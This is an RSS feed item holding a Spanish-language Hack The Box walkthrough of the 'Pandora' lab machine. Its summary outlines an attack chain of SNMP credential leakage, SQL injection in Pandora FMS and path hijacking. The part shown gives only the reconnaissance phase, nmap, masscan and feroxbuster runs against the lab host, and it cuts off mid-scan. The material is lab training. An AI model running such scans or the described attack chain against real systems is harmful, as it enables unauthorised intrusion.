<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>pandora fms on sckull</title>
    <link>https://sckull.github.io/tags/pandora-fms/</link>
    <description>Recent content in pandora fms on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Fri, 20 May 2022 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/pandora-fms/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Pandora</title>
        <link>https://sckull.github.io/posts/pandora/</link>
        <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 20 May 2022 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/pandora/</guid>
        <description>Pandora expone snmp, servicio por el cual obtuvimos credenciales y acceso por SSH. Encontramos una version de Pandora FMS vulnerable a SQLi, la cual nos permitió obtener privilegios de admin y posteriormente acceso a un segundo usuario.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/pandora/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Pandora expone snmp, servicio por el cual obtuvimos credenciales y acceso por SSH. Encontramos una version de Pandora FMS vulnerable a SQLi, la cual nos permitió obtener privilegios de admin y posteriormente acceso a un segundo usuario. Finalmente escalamos privilegios tras realizar Path Hijacking.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/423&#34;&gt;Pandora&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;os_type&#34;&gt; Linux &lt;img src=&#34;https://sckull.github.io/images/icons/linux.png&#34; class=&#34;img_type_os&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.11.136&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/114053&#34;&gt;TheCyberGeek&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/114053&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker2&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/610173&#34;&gt;dmw0ng&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/610173&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.2, 5.2, 5.6, 4.4, 4.8],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra abierto los puertos: http (80) y ssh (22).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Sun Jan 30 02:46:35 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.136&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; pandora.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.136&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.071s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Play &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Landing
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Jan 30 02:46:46 2022 -- 1 IP address (1 host up) scanned in 10.46 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;El sitio web parece ser estatico, y muestra una descripcion de una &amp;ldquo;extensión&amp;rdquo; llamada: PLAY.&lt;/p&gt;
&lt;div class=&#34;expand&#34;&gt;
  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
    &lt;/span&gt;
    Expand me - Full Website
  &lt;/button&gt;
  &lt;div class=&#34;expand__content&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/pandora/Screenshot_pandora_website_main.png&#34; alt=&#34;image&#34; /&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;feroxbuster&lt;/code&gt; únicamente muestra direcciones de la plantilla del sitio web.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;####################] - 15m   220545/220545  244/s   http://pandora.htb/&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      2635/220545  26/s    http://pandora.htb/assets
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1835/220545  19/s    http://pandora.htb/assets/images
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1959/220545  21/s    http://pandora.htb/assets/css
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1777/220545  19/s    http://pandora.htb/assets/images/about
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1808/220545  19/s    http://pandora.htb/assets/images/logo
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1440/220545  16/s    http://pandora.htb/assets/images/banner
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1366/220545  15/s    http://pandora.htb/assets/js
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1555/220545  18/s    http://pandora.htb/assets/images/blog
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1545/220545  18/s    http://pandora.htb/assets/images/testimonials
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1291/220545  16/s    http://pandora.htb/assets/images/footer
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 1m      1115/220545  14/s    http://pandora.htb/assets/images/team
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;-------------------&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; - 36s      223/220545  9/s     http://pandora.htb/assets/images/404
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---daniel&#34;&gt;User - Daniel&lt;/h1&gt;
&lt;h2 id=&#34;snmp&#34;&gt;snmp&lt;/h2&gt;
&lt;p&gt;Tras explorar y jugar con el sitio web no encontramos alguna vulnerabilidad. Realizamos nuevamente un escaneo de puertos esta vez con &lt;code&gt;masscan&lt;/code&gt;, el cual nos mostró el puerto 161 udp abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ sudo /usr/bin/masscan -p1-65535,U:1-65535 10.10.11.136 -e tun0
Starting masscan 1.3.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-01-30 03:15:12 GMT
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.11.136
Discovered open port 80/tcp on 10.10.11.136
Discovered open port 161/udp on 10.10.11.136
 π ~/htb/pandora ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El puerto &lt;a href=&#34;https://es.adminsub.net/tcp-udp-port-finder/161&#34;&gt;161/udp&lt;/a&gt; pertenece al servicio &lt;code&gt;snmp&lt;/code&gt;, verificamos la version utilizando &lt;code&gt;nmap&lt;/code&gt; el cual indica &lt;code&gt;v1&lt;/code&gt; y &lt;code&gt;v3&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ sudo nmap -sU -sV 10.10.11.136 -p161
Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-01-30 02:50 UTC
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; pandora.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.136&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
